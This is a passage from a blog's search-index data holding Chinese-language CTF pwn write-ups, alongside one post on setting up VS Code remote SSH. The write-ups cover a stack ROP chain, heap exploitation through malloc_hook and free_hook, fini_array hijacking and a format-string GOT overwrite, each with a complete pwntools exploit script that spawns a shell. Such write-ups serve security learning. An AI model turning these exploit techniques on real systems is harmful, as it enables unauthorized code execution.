cyclic(0x18)+p32(bss_addr-4)+p32(leave_addr)io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"ciscn_2019_s_3","slug":"ciscn-2019-s-3","date":"2022-11-14T11:38:19.000Z","updated":"2023-09-14T17:18:44.000Z","comments":true,"path":"2022/11/14/ciscn-2019-s-3/","link":"","permalink":"http://example.com/2022/11/14/ciscn-2019-s-3/","excerpt":"","text":"Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 主体函数非常简单 利用系统调用号实现了一次输入和输出 signed __int64 vuln()&#123; signed __int64 v0; // rax char buf[16]; // [rsp+0h] [rbp-10h] BYREF v0 = sys_read(0, buf, 0x400uLL); return sys_write(1u, buf, 0x30uLL);&#125; 还有一个gadget函数 看一下汇编代码 .text:00000000004004D6 ; =============== S U B R O U T I N E =======================================.text:00000000004004D6.text:00000000004004D6 ; Attributes: bp-based frame.text:00000000004004D6.text:00000000004004D6 public gadgets.text:00000000004004D6 gadgets proc near.text:00000000004004D6 ; __unwind &#123;.text:00000000004004D6 push rbp.text:00000000004004D7 mov rbp, rsp.text:00000000004004DA mov rax, 0Fh.text:00000000004004E1 retn.text:00000000004004E1 gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2 ; ---------------------------------------------------------------------------.text:00000000004004E2 mov rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 retn.text:00000000004004E9 ; --------------------------------------------------------------------------- 下方的0x3b则为59 是execve的系统调用号 应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址 所以只能通过写入栈上 要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10 还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流 .text:00000000004004ED ; __unwind &#123;.text:00000000004004ED push rbp.text:00000000004004EE mov rbp, rsp.text:00000000004004F1 xor rax, rax.text:00000000004004F4 mov edx, 400h ; count.text:00000000004004F9 lea rsi, [rsp+buf] ; buf.text:00000000004004FE mov rdi, rax ; fd.text:0000000000400501 syscall ; LINUX - sys_read.text:0000000000400503 mov rax, 1.text:000000000040050A mov edx, 30h ; &#x27;0&#x27; ; count.text:000000000040050F lea rsi, [rsp+buf] ; buf.text:0000000000400514 mov rdi, rax ; fd.text:0000000000400517 syscall ; LINUX - sys_write.text:0000000000400519 retn.text:0000000000400519 vuln endp ; sp-analysis failed.text:0000000000400519.text:0000000000400519 ; --------------------------------------------------------------------------- from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))gdb.attach(io)print(hex(stack_addr)) 可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移 这里的原因暂时没有办法得知 先放着这个疑问 下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu 具体的流程我就不过多赘述了 rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)binsh_addr = stack_addr - 0x138payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload) 这里重点解释一下三个方面 1.为什么要多出一个p64(int59_addr)在栈上 这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的 2.binsh_addr和stack_addr的偏移是怎么求出来的 我们将断点打在csu执行到call r12那一行 然后gdb看一下栈 可以计算出偏移为0x138 还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向 如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容 set $rsp = $rsp-0x150 看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧 最终exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,26678)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;main_addr = elf.sym[&#x27;main&#x27;]payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*7+b&quot;c&quot;+p64(main_addr)io.send(payload)io.recvuntil(&quot;c&quot;)io.recv(16)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))binsh_addr = stack_addr - 0x138rdi_addr = 0x4005a3syscall_addr = 0x400517int59_addr = 0x4004E2gadget2_addr = 0x400596gadget1_addr = 0x400580payload = b&quot;/bin/sh\\x00&quot;+b&quot;a&quot;*8+p64(int59_addr)+p64(gadget2_addr)payload += cyclic(0x8)payload += p64(0)payload += p64(1)payload += p64(binsh_addr+0x10)payload += p64(0)*3payload += p64(gadget1_addr)payload += cyclic(56)payload += p64(rdi_addr)payload += p64(binsh_addr)payload += p64(syscall_addr)io.sendline(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"babyheap_0ctf_2017","slug":"babyheap-0ctf-2017","date":"2022-11-14T01:24:11.000Z","updated":"2023-09-14T17:18:42.000Z","comments":true,"path":"2022/11/14/babyheap-0ctf-2017/","link":"","permalink":"http://example.com/2022/11/14/babyheap-0ctf-2017/","excerpt":"","text":"查看一下保护机制 Arch: amd64-64-littleRELRO: Full RELROstack: Canary foundNX: NX enabledPIE: PIE enabled FULL RELRO要注意一下 ida反编译一下 __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v4; // [rsp+8h] [rbp-8h] v4 = sub_B70(a1, a2, a3); while ( 1 ) &#123; menu(); switch ( choice() ) &#123; case 1LL: add(v4); break; case 2LL: edit(v4); break; case 3LL: delete(v4); break; case 4LL: print(v4); break; case 5LL: return 0LL; default: continue; &#125; &#125;&#125; 需要留意的是释放堆块的时候 指针也置零了 没有办法uaf 但是edit可以进行堆溢出 题目docker环境为16.04 那么显而易见 有输出函数以及堆溢出的机会 这里用到unsortedbin泄露基址 #前置exp:from pwn import*context.log_level = &quot;debug&quot;#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,25931)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc&quot;)def add(size): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size:&quot;) io.sendline(str(size)) io.recv()def edit(index,size,payload): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content:&quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index)) 先申请一个chunk0 用于堆溢出覆盖chunk1的size域 从而使chunk1和chunk2合并 add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3 #chunk3的作用则是防止堆块释放后和top chunk合并payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,len(payload),payload) gdb看一下此时堆块结构 可以看到已经成功合并了chunk1和chunk2 此时我们free掉chunk1 该合并堆块就会进入到unsortedbin 此时其fd和bk就指向了main_arena+88 我们如果再申请一个0x68大小的chunk 此时bin将会把前半部分的堆块分配出来 于是fd和bk的内容我们就可以通过print新申请的堆块打印出来 add(0x68)#3&amp;1show(2)io.recvuntil(&quot;Content:&quot;)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;)) 还差一点 要如果才能确定偏移 从而计算出libc基址 这里我们进行gdb动调 我们需要求出main_arena+88和libc基址的偏移 则可求得 偏移 &#x3D; 0x7f35f3b9bb78-0x7f35f37d7000 由于开启了FULL RELRO 我们并没有办法篡改got表 但是此时是ubuntu16.04版本环境 我们想到了使用malloc_hook的攻击方法 libc_addr = addr - (0x7fc2d9938b78-0x7fc2d9574000)malloc_hook = libc_addr+libc.sym[&quot;__malloc_hook&quot;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;] 此时我们再次申请一个大小为0x68的chunk 它会分配到剩下一半的unsortedbin的空间 但是你要注意到 chunk2的指针不是还没被置零吗 chunk2和我们新申请到的chunk指向了同一片空间 这不就可以做到uaf吗 于是我们再次释放chunk2 然后编辑chunk4的内容 覆盖chunk2的fd域 就可以使我们目标地址串连到fastbin上 add(0x68)#4&amp;2delete(2)edit(4,len(p64(malloc_hook)),p64(malloc_hook-0x23)) 此时我们连续申请两个堆块 第二个堆块就是分配到对应地址的空间 此时我们编辑第二个堆块 覆盖malloc_hook为onegadget地址 这样我们在申请新chunk时系统调用malloc函数时就会调用onegadget add(0x68)#4 add(0x68)#5 onegadget = 0x4526a+libc_addr #0x45216 0x4526a 0xf02a4 0xf1147payload = cyclic(0x8+0xb)+p64(onegadget)edit(5,len(payload),payload)add(0x30)io.interactive() 完整exp: from pwn import*context.log_level = &quot;debug&quot;io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25931)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc&quot;)def add(size): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size:&quot;) io.sendline(str(size)) io.recv()def edit(index,size,payload): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content:&quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;Command:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index:&quot;) io.sendline(str(index))add(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,len(payload),payload)delete(1)add(0x68)#3&amp;1show(2)io.recvuntil(&quot;Content:&quot;)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = addr - (0x7fc2d9938b78-0x7fc2d9574000)malloc_hook = libc_addr+libc.sym[&quot;__malloc_hook&quot;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]add(0x68)#4&amp;2delete(2)edit(4,len(p64(malloc_hook)),p64(malloc_hook-0x23))add(0x68)#4 add(0x68)#5 onegadget = 0x4526a+libc_addr #0x45216 0x4526a 0xf02a4 0xf1147payload = cyclic(0x8+0xb)+p64(onegadget)edit(5,len(payload),payload)add(0x30)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"vscode远程连接","slug":"vscode远程连接","date":"2022-11-13T07:12:44.000Z","updated":"2024-11-07T02:21:38.000Z","comments":true,"path":"2022/11/13/vscode远程连接/","link":"","permalink":"http://example.com/2022/11/13/vscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/","excerpt":"","text":"先把虚拟机需要的环境配置一下 sudo apt install openssh-server sudo apt install curl 接着在物理机上创建一下ssh密匙 ssh-keygen -t rsa -b 4096 -f %USERPROFILE%/.ssh/debian_rsa 然后自己下载一个vscode 下载后打开 在扩展中搜索remote 安装这个 然后进入到设置里面勾选这个 然后左下角会多出来一个绿色的图标 按图上的点击顺序 选择第一个 然后自行配置 Host 名称HostName ip地址User 虚拟机用户名IdentityFile &quot;C:\\Users\\xxxxx\\.ssh\\debian_rsa&quot; //物理机的ssh私匙目录 接着试着连接一下 输入密码后就连接上了虚拟机 但是每次都输入密码太麻烦了 我们之前弄的ssh就是为了免密连接 在虚拟机对应目录下 创建一个文件authorized_keys 接着把物理机中该文件的内容复制到虚拟机刚刚创建的文件中 C:\\Users\\xxxx\\.ssh\\debian_rsa.pub 然后就可以做到免密连接了 2023&#x2F;3&#x2F;6记今天配置kali虚拟机的远程连接的时候迟迟连接不上 原来是因为ssh服务并没有启动 // 重启ssh 服务 sudo service ssh --full-restart// 自动启动 sudo systemctl enable ssh 2024&#x2F;11&#x2F;7记部分机子 比如kali或者云服务器 可能没有开启免密连接的权限打开&#x2F;etc&#x2F;ssh&#x2F;sshd_config找到对应项 更改为yes 并且指定密钥文件 PubkeyAuthentication yesAuthorizedKeysFile .ssh/authorized_keys 随后重启ssh服务即可 sudo systemctl restart sshd if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"ISCTF2022-null","slug":"ISCTF2022-null","date":"2022-11-02T09:21:10.000Z","updated":"2023-09-14T17:19:50.000Z","comments":true,"path":"2022/11/02/ISCTF2022-null/","link":"","permalink":"http://example.com/2022/11/02/ISCTF2022-null/","excerpt":"","text":"看一下保护机制 再拖到ida查看一下main函数 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;1.ADD&quot;); puts(&quot;2.CHANGE&quot;); puts(&quot;3.PRINT&quot;); puts(&quot;4.DEL&quot;); putchar(&#x27;:&#x27;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 != 2 ) break; edit(); &#125; if ( v3 &gt; 2 ) &#123; if ( v3 == 3 ) &#123; print(); &#125; else if ( v3 == 4 ) &#123; del(); &#125; else &#123;LABEL_13: puts(&quot;NO CHOICE&quot;); &#125; &#125; else &#123; if ( v3 != 1 ) goto LABEL_13; add(); &#125; &#125;&#125; 菜单题 其他函数没有什么好说的 重点看两个函数 delete和edit unsigned __int64 del()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt;= 31 ) &#123; free(Page[v1]); Page[v1] = 0LL; Size[v1] = 0; &#125; return __readfsqword(0x28u) ^ v2;&#125; 指针置零了 没有办法UAF unsigned __int64 edit()&#123; int v1; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt;= 31 &amp;&amp; Page[v1] ) &#123; printf(&quot;Content: &quot;); vuln(Page[v1], Size[v1]); &#125; return __readfsqword(0x28u) ^ v2;&#125; 具体跟进到vuln函数 void __fastcall vuln(_BYTE *a1, int a2)&#123; int v2; // [rsp+14h] [rbp-Ch] if ( a2 &gt; 0 ) &#123; v2 = 0; while ( read(0, a1, 1uLL) == 1 ) &#123; if ( *a1 == &#x27;\\n&#x27; || (++a1, v2 == a2) ) &#123; *a1 = 0; return; &#125; ++v2; &#125; &#125;&#125; 注意这里有一个off by null的漏洞 读入的换行符会被替换成0 首先要泄露libc基址 这里采用unsortedbin泄露基址的办法 但是由于远程靶机的版本是ubuntu18.04 新增了tcache 所以我们要先把tcache填满 前置代码: from os import lseekfrom pwn import*#io = process(&quot;./null&quot;)io = remote(&quot;120.79.18.34&quot;,20273)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./null&quot;)context.log_level = &quot;debug&quot;def add(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size)) io.recvuntil(&quot;OK&quot;)def free(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def edit(index,content): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def print(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) add(0,0x18)#0add(1,0x68)#1add(2,0x68)#2for i in range(3,10): add(i,0xd0)for i in range(3,10): free(i)edit(0,b&#x27;a&#x27;*0x18+b&#x27;\\xe1&#x27;) 我们先申请三个堆块 chunk1和2用来合并成一个fake chunk 这里注意一下后续申请的七个chunk大小 后续gdb动调看一下就很容易明白 这里可以看到 chunk1和chunk2已经合并成了一个0xe1大小的堆块 我们具体查看一下当前chunk的内容 可以看到是因为刚才的edit改变了chunk1的size大小 接着我们free一下chunk1 此时由于tcache已经被填满了 所以chunk1就会被释放到unsortedbin 由于其机制 所以此时fd和bk都会指向main_arena+0x??的地址 通过再次申请一个chunk 再调用print函数 就可以打印出我们需要的地址 此时再计算偏移 就可以求出基址 free(1)add(10,0x68)print(10) 我们逐步拆分一下这一层的操作 首先是执行完free 成功划入unsortedbin 再申请一个大小为0x68的chunk(只申请一半 是为了接下来的double free做铺垫) 跟进看一下新申请的chunk的内容 这里你会发现两个的chunk fd和bk差了208 这正是0xd0的十进制 但是这并不妨碍我们计算基址 记录下此时动调的fd值 在gdb中我们输入vmmap libc查看一下当前程序运行的libc基址 然后求出偏移 虽然程序每次运行的libc基址和我们泄露出来的main_arena地址都会变化 但是这个偏移值是固定的 libc_addr = main_arena_addr - offsetoffset = 0x7fa1d8fa7d70 - 0x7fa1d8bbc000 基址出来以后 one_gadget和free_hook以及system的地址都可以求出来了 由于程序开启了FULL RELRO保护 我们不能篡改free函数的got表 但是我们可以修改free_hook函数的got表 这里可以应用double free的办法来把free_hook的函数地址放到tcache链上 先把计算基址和一些必要的数据的exp放出来 print(10)free_got = elf.got[&#x27;free&#x27;]io.recvuntil(&quot;Content: &quot;)main_arean = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arean -(0x7f91b42a5d70-0x7f91b3eba000)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))onegadget_addr = libc_addr + 0x4f302free_hook = libc.symbols[&#x27;__free_hook&#x27;]+libc_addr 此时我们再次申请一个大小为0x68的chunk 你会发现 这个chunk的指针和我们之前申请的chunk2是共享的 所以我们可以先free chunk2 再编辑chunk11的内容 此时你会发现我们编辑进chunk11的内容会被串连到bin链上 add(11,0x68)free(2)edit(11,p64(free_hook)) 此时我们再申请一个chunk 就会取出bin中第一个chunk 再取出一个 就会获得指向free_hook的chunk 此时我们编辑该chunk的内容 就相当于像free_hook中写入任意 最终exp: from os import lseekfrom pwn import*io = process(&quot;./null&quot;)libc = ELF(&quot;./libc-2.27.so&quot;)elf = ELF(&quot;./null&quot;)context.log_level = &quot;debug&quot;def add(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size)) io.recvuntil(&quot;OK&quot;)def free(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def edit(index,content): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(content)def print(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x18)#0add(1,0x68)#1add(2,0x68)#2for i in range(3,10): add(i,0xd0)for i in range(3,10): free(i)edit(0,b&#x27;a&#x27;*0x18+b&#x27;\\xe1&#x27;)free(1)add(10,0x68)print(10)free_got = elf.got[&#x27;free&#x27;]io.recvuntil(&quot;Content: &quot;)main_arean = u64(io.recvuntil(&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arean -(0x7f91b42a5d70-0x7f91b3eba000)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))onegadget_addr = libc_addr + 0x4f302free_hook = libc.symbols[&#x27;__free_hook&#x27;]+libc_addr add(11,0x68)free(2)edit(11,p64(free_hook))add(12,0x68)add(13,0x68)edit(13,p64(onegadget_addr))free(13)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"fini劫持","slug":"fini劫持","date":"2022-10-12T08:05:30.000Z","updated":"2023-09-14T17:19:02.000Z","comments":true,"path":"2022/10/12/fini劫持/","link":"","permalink":"http://example.com/2022/10/12/fini%E5%8A%AB%E6%8C%81/","excerpt":"","text":"基础概念 一个程序在执行的时候 其并不是直接执行main函数 先是执行入口函数 入口函数对运行库和程序运行环境进行初始化，包括堆、I&#x2F;O、线程、全局变量的构造等等 在完成初始化之后，调用main函数，正式开始执行函数主体部分 main函数执行完毕之后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁、关闭I&#x2F;O等，然后进行系统调用结束进程 这里不具体到各个入口函数的区别 因为属于概念问题 理解起来不会有难度 可以自行查阅wiki 总之 如果只是为了做题而记忆 可以按下面理解 在静态编译下bss段中会存放一个fini数组 在main函数结束后 程序指向了fini函数 其会先跳转到fini[1]存放的地址 接着返回fini[0]存放的地址 所以我们只需要将fini[1]修改为我们想要控制执行流的地方 再把fini[0]修改成fini函数 程序就会陷入死循环 重复的执行fini[1]指向的地址 动态编译下 fini数组不会存储在bss段中 并且也只有一个字长 (不知道是不是我遇到的这题的特殊情况) 直接将这个地址的值覆盖成要重复执行的函数地址就行了 不过在我遇到的这题中好像就只能跳转一次 不能理论无限执行 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"格式化字符串任意写&泄露基址","slug":"格式化字符串任意写-泄露基址","date":"2022-10-12T02:25:53.000Z","updated":"2023-09-14T17:18:08.000Z","comments":true,"path":"2022/10/12/格式化字符串任意写-泄露基址/","link":"","permalink":"http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/","excerpt":"","text":"本篇主要讲述两个知识点： 格式化字符串任意写和泄露基址 我们在最初的格式化字符串漏洞学习中 已经掌握了查看偏移和篡改地址的数据的能力 但是如果是篡改puts函数的got表呢？ 我们知道 动态链接的情况下 当我们调用一个函数时 他会寻址其got表内存储的真实地址(即对应函数在libc文件中的地址) 从而成功调用 如果我们将其got表内存储的真实地址修改为其他函数的真实地址 那么当程序调用原函数时 就相当于调用了篡改后的函数 payload = fmtstr_payload(offset, &#123;puts_got:system_addr &#125;) 以上述payload为例 假设我们需要修改puts函数的got表 使其为system函数的地址 那么我们就可以这样构造payload(这里注意一下，fmtstr这个工具是会自己补齐字长的 这将影响到我们下文中一道例题 现在留个意就行了) ps:并且这个工具默认生成的是32位情况下 如果需要切换到64位 需要自己手动添加 context.arch = &quot;amd64&quot; 但是一般题目除非出题人好心 不然真实地址还是得我们自己泄露的吧 那如何一并利用格式化字符串泄露函数的真实地址呢？ 还记不记得 格式化字符串最开始的漏洞利用 就是泄露栈上的内容 如果我们将got表写入栈上 那是不是也可以通过格式化字符串漏洞将其泄露出来？ payload = b&quot;%n$s&quot;.ljust(16,b&quot;\\x00&quot;)+p64(puts_got) 这里有几点要注意一下 一个是n 注意是地址所在的偏移 还有一点是格式化字符这里选择的是s 最后一个疑惑在于为什么要用\\x00补齐16个字节 这个我也不懂 死记就完事了(你也可以试试不补齐 然后看会泄露个啥出来) 好了 接下来用一题例题来演示一下 方便理解(例题还涉及到了fini劫持的知识点 不懂的话建议先去看另外一篇) HNCTF2022-[WEEK2]fmtstr_level2附件有给libc文件 猜测要用到泄露基址 checksec看一下进制和保护 有canary 要么泄露绕过 要么就不能栈溢出了 再看一下程序 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[296]; // [rsp+0h] [rbp-130h] BYREF unsigned __int64 v5; // [rsp+128h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(&quot;Welcome to the game of formatting strings&quot;); puts(&quot;Be careful, you only get one shot at this game&quot;); puts(&quot;First please tell me your game ID&quot;); read(0, buf, 0x100uLL); printf(buf); puts(&quot;Okk,try to hack it;sh&quot;); return 0;&#125; 唯一看起来有价值的就只有main函数了 没有任何的后门函数 甚至buf的字节也不够栈溢出 但是注意看 最后的puts输出的字符串有sh 那么可以猜测出题目的解法是修改got表 结果我们只有一次格式化字符串任意写的机会 好像并不能满足泄露地址后再修改got表的需求 但是如果我们将fini_array的值改为main函数 那么程序结束后 就会重新返回到main函数 那么我们就有了第二次利用格式化字符串的机会 于是解题思路可以分为两步 1.修改fini_array和泄露函数真实地址 2.将puts_got修改为system函数 那么接下来开始编写exp gdb查看了偏移以后 发现我们输入的第一个字长的数据位于偏移6的地方 第一个payload的难点在于搞清楚两个格式化字符串的偏移和payload的结构 payload = fmtstr_payload(6, &#123;fini_addr:main_addr&#125;)payload += b&quot;%17$s&quot;.ljust(16,b&quot;\\x00&quot;)+p64(puts_got) //6+8（第一行payload字节数64）+2+1 按照我们上文所说的是不是应该这么构造payload 但是你会发现最后泄露出来的地址是 aaaaba+fini_array的地址(0x4031f0) 前面的aaaaba是什么东西？ 我们打印出fmtstr构造的数据看看 可以看到aaaaba出自这里 这里就是我们上文所说到的fmtstr的自动补齐一个字长 而后面的\\x00也是为了传送地址(但是地址只有三字节 所以需要5个\\x00才补齐一个字长) 那么说回我们刚才的错误 其原因在于我们需要将格式化字符串放在一起 地址放在一起 才能两次利用一个漏洞点 所以 正确的payload应该把aaaaba替换成泄露地址的格式化字符串 payload = b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\\xf01@\\x00\\x00\\x00\\x00\\x00\\xf11@\\x00\\x00\\x00\\x00\\x00\\xf21@\\x00\\x00\\x00\\x00\\x00&quot;payload += p64(puts_got) 但是这里我们会发现 recv接收到的数据太多了 像ret2libc中的接收办法显然是会出错的 puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;)) 这里用到[-6:] 只接收后六个字节 那么我们此时成功进行了fini劫持 我们再输入io.recv()就会发现又接收到了main函数开始时puts的那些字符串 第二次的payload就简单至极了 最后放下完整的exp吧 from pwn import*context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;io = remote(&quot;1.14.71.254&quot;,28466)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;First please tell me your game ID&quot;)fini_addr = 0x4031F0main_addr = 0x4011b6ret_addr = 0x40101aputs_got = elf.got[&#x27;puts&#x27;]payload = b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\\xf01@\\x00\\x00\\x00\\x00\\x00\\xf11@\\x00\\x00\\x00\\x00\\x00\\xf21@\\x00\\x00\\x00\\x00\\x00&quot;payload += p64(puts_got)io.sendline(payload)io.recv()puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]hex(libc_addr)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]io.recv()io.recvuntil(&quot;First please tell me your game ID&quot;)payload = fmtstr_payload(6,&#123;puts_got:system_addr&#125;)io.sendline(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); 